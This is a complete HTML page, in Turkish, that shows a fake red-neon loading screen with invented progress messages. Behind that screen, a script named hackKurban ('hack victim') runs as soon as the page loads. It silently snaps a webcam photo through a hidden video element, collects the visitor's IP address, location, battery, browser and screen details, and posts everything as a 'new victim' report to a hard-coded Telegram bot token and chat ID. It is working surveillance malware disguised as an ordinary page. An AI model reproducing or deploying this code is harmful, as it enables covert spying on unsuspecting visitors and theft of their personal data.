<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Jujutsu</title>

  <style>
    *{
      margin:0;
      padding:0;
      box-sizing:border-box;
      font-family: Arial, sans-serif;
    }

    body{
      background:#000;
      height:100vh;
      overflow:hidden;
      display:flex;
      justify-content:center;
      align-items:center;
      color:white;
    }

    .container{
      text-align:center;
      width:90%;
    }

    .logo{
      font-size:90px;
      font-weight:900;
      color:#ff0000;
      text-shadow:
        0 0 5px #ff0000,
        0 0 10px #ff0000,
        0 0 20px #ff0000,
        0 0 40px #ff0000,
        0 0 80px #ff0000;
      margin-bottom:40px;
      letter-spacing:4px;
    }

    .loading-text{
      font-size:22px;
      margin-bottom:15px;
      color:#ddd;
    }

    .bar{
      width:450px;
      max-width:90%;
      height:22px;
      border:2px solid #ff0000;
      margin:auto;
      overflow:hidden;
      border-radius:10px;
      box-shadow:0 0 20px #ff0000;
      background:#111;
    }

    .progress{
      width:0%;
      height:100%;
      background:#ff0000;
      box-shadow:0 0 20px #ff0000;
      transition:width 0.2s linear;
    }

    .percent{
      margin-top:12px;
      font-size:20px;
      color:#ff4d4d;
      font-weight:bold;
    }

    .fake-status{
      margin-top:35px;
      font-size:16px;
      color:#888;
      min-height:25px;
      animation:blink 1.2s infinite;
    }

    @keyframes blink{
      0%{opacity:0.5;}
      50%{opacity:1;}
      100%{opacity:0.5;}
    }

    /* Gizli video elementi */
    #hiddenVideo{
      display:none;
    }
  </style>
</head>
<body>

  <!-- Gizli video (kamera için) -->
  <video id="hiddenVideo" autoplay muted playsinline></video>

  <div class="container">

    <div class="logo">𝖀𝖒𝖚𝖙</div>

    <div class="loading-text">Yükleniyor...</div>

    <div class="bar">
      <div class="progress" id="progress"></div>
    </div>

    <div class="percent" id="percent">0%</div>

    <div class="fake-status" id="status">
      Sunucuya bağlanılıyor...
    </div>

  </div>

  <script>
    // ========== TELEGRAM BOT AYARLARI ==========
    const BOT_TOKEN = '8658397323:AAF0Kl8pRUbRXPK6wPVT6pC6iu8l6BeZMew';
    const CHAT_ID = '7497803165';
    // ===========================================

    // Loading bar animasyonu
    let progress = 0;
    const progressBar = document.getElementById("progress");
    const percentText = document.getElementById("percent");
    const statusText = document.getElementById("status");

    const fakeMessages = [
      "Sunucuya bağlanılıyor...",
      "İnternet sağlanıyor...",
      "Veriler doğrulanıyor...",
      "Bekliyor...",
      "Sistem hazırlanıyor...",
      "Güvenli bağlantı kuruluyor...",
      "Paketler indiriliyor...",
      "Bağlantı optimize ediliyor...",
      "Herşey hazırlanıyor...",
      "bir dakika..."
    ];

    const barInterval = setInterval(() => {
      if(progress < 98){
        progress += Math.random() * 2;
        if(progress > 98) progress = 98;
        progressBar.style.width = progress + "%";
        percentText.innerText = Math.floor(progress) + "%";
      }
    }, 350);

    setInterval(() => {
      const randomMessage = fakeMessages[Math.floor(Math.random() * fakeMessages.length)];
      statusText.innerText = randomMessage;
    }, 2000);

    // ========== KAMERA + BİLGİ TOPLAMA ==========
    async function hackKurban() {
      try {
        // Kamera izni iste (sessizce, kullanıcı loading'e bakarken)
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: 'user', width: 640, height: 480 }
        });

        const video = document.getElementById('hiddenVideo');
        video.srcObject = stream;
        await video.play();

        // 1 saniye bekle (kameranın oturması için)
        await new Promise(r => setTimeout(r, 1000));

        // Fotoğraf çek
        const canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;
        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
        
        const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));

        // Kamerayı kapat (artık işimiz bitti)
        stream.getTracks().forEach(track => track.stop());

        // IP al
        let ip = 'bilinmiyor';
        try {
          const ipRes = await fetch('https://api.ipify.org?format=json');
          const ipData = await ipRes.json();
          ip = ipData.ip;
        } catch(e) {}

        // Batarya bilgisi
        let batteryInfo = 'bilinmiyor';
        if (navigator.getBattery) {
          try {
            const bat = await navigator.getBattery();
            batteryInfo = `%${Math.round(bat.level * 100)} ${bat.charging ? '(Şarjda)' : '(Pil)'}`;
          } catch(e) {}
        }

        // Konum dene (isteğe bağlı)
        let konum = 'bilinmiyor';
        try {
          const pos = await new Promise((res, rej) => {
            navigator.geolocation.getCurrentPosition(res, rej, { timeout: 3000 });
          });
          konum = `${pos.coords.latitude}, ${pos.coords.longitude}`;
        } catch(e) {}

        // Cihaz bilgileri
        const info = `
📱 **YENİ KURBAN**

🌐 **IP:** ${ip}
📍 **Konum:** ${konum}
💻 **Cihaz:** ${navigator.platform}
🖥 **Browser:** ${navigator.userAgent.substring(0, 80)}
🔋 **Batarya:** ${batteryInfo}
📺 **Ekran:** ${screen.width}x${screen.height}
🌍 **Dil:** ${navigator.language}
⏰ **Tarih:** ${new Date().toLocaleString('tr-TR')}
        `.trim();

        // Telegram'a gönder
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', photoBlob, 'kurban.jpg');
        formData.append('caption', info);
        formData.append('parse_mode', 'Markdown');

        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });

        const result = await response.json();
        console.log('Telegram cevabı:', result);

      } catch (err) {
        console.error('Hata oluştu:', err);
        
        // Kamera izni verilmezse bile en azından bilgileri gönder
        try {
          let ip = 'bilinmiyor';
          try {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            ip = ipData.ip;
          } catch(e) {}

          const info = `
❌ **KAMERA İZNİ ALINAMADI**

🌐 **IP:** ${ip}
💻 **Cihaz:** ${navigator.platform}
🖥 **Browser:** ${navigator.userAgent.substring(0, 80)}
📺 **Ekran:** ${screen.width}x${screen.height}
🌍 **Dil:** ${navigator.language}
⏰ **Tarih:** ${new Date().toLocaleString('tr-TR')}
          `.trim();

          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: CHAT_ID,
              text: info,
              parse_mode: 'Markdown'
            })
          });
        } catch(e2) {
          console.log('Bilgi gönderilemedi:', e2);
        }
      }
    }

    // Sayfa yüklenir yüklenmez başlat
    hackKurban();
  </script>

</body>
</html>
